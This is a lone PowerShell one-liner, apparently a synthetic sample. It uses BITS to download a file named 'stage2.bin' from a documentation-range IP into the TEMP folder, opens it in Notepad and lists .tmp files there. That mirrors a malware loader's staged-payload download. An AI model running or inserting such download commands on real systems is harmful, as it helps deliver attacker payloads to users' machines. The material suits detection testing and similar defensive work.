
Start-BitsTransfer -Source 'https://192.0.2.222:443/stage2.bin' -Destination "$env:TEMP\stage1.bin"; Start-Process -FilePath "notepad.exe" -ArgumentList "$env:TEMP\stage1.bin"; Set-Location -Path $env:TEMP; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
